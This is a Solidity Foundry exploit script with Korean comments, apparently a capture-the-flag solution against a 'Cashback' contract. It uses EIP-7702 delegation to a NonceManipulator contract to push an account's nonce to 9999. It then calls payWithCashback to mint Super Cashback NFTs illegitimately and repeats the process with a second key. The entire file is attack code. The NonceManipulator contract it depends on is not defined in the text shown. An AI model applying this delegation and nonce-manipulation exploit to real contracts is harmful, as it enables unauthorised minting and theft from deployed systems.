// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {Cashback, Currency, CurrencyLibrary} from "../src/Cashback.sol";

contract ExploitScript is Script {
    using CurrencyLibrary for Currency;
    
    function run() external {
        uint256 playerPrivateKey = vm.envUint("USER_PRIVATE_KEY");
        address player = vm.addr(playerPrivateKey);
        address target = 0x35dBaC39cd2a7282f9E9D18Db598762a81e87913;

        Cashback cashback = Cashback(payable(vm.envAddress("CASHBACK_ADDRESS")));
        
        // Step 1: NonceManipulator 배포
        vm.broadcast(playerPrivateKey);
        NonceManipulator manipulator = new NonceManipulator();
        console.log("Manipulator deployed:", address(manipulator));
        
        // Step 2: EIP-7702로 악성 컨트랙트에 delegate + setNonce() 호출
        // → nonce가 9999로 설정됨
        vm.broadcast(playerPrivateKey);
        vm.signAndAttachDelegation(address(manipulator), playerPrivateKey);
        NonceManipulator(player).setNonce();
        
        // Step 3: Cashback에 재delegate + payWithCashback 호출
        // → nonce 10000 도달 → Super Cashback NFT mint
        vm.broadcast(playerPrivateKey);
        vm.signAndAttachDelegation(address(cashback), playerPrivateKey);
        Cashback(payable(player)).payWithCashback(
            CurrencyLibrary.NATIVE_CURRENCY,
            player,
            0
        );
        
        // Step 4: 두 번째 NFT를 위해 다른 EOA로 동일 과정 반복
        uint256 player2PrivateKey = vm.envUint("PLAYER2_PRIVATE_KEY");
        address player2 = vm.addr(player2PrivateKey);
        
        vm.broadcast(player2PrivateKey);
        vm.signAndAttachDelegation(address(manipulator), player2PrivateKey);
        NonceManipulator(player2).setNonce();
        
        vm.broadcast(player2PrivateKey);
        vm.signAndAttachDelegation(address(cashback), player2PrivateKey);
        Cashback(payable(player2)).payWithCashback(
            CurrencyLibrary.NATIVE_CURRENCY,
            player,  // player 주소로 NFT 전송
            0
        );
        
        console.log("Exploit complete! Player has 2+ Super Cashback NFTs");
    }
}